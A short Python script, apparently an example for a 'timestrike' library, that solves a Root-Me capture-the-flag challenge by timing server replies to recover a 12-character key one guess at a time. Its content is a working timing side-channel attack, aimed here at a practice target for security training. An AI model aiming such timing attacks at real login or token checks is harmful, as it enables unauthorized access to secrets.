import asyncio
import time

import sys
import os

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../src/')))

from timestrike.async_functions import *

semaphore = asyncio.Semaphore(3)

async def measure_time(message):
    async with semaphore:
        reader, writer = await asyncio.open_connection('challenge01.root-me.org', 51015)
        await reader.read(1024)
        writer.write(message.encode())
        await writer.drain()  # Ensure the message is sent
        start_time = time.time()
        await reader.read(1024)
        end_time = time.time()
        response_time = end_time - start_time
        writer.close()
        await writer.wait_closed()  # Ensure the writer is closed properly
    return response_time

async def main():
    k = await get_key(measure_time, sample=1, length=12, print_keys=True)
    print(f"Recovered key: {k}")

asyncio.run(main())
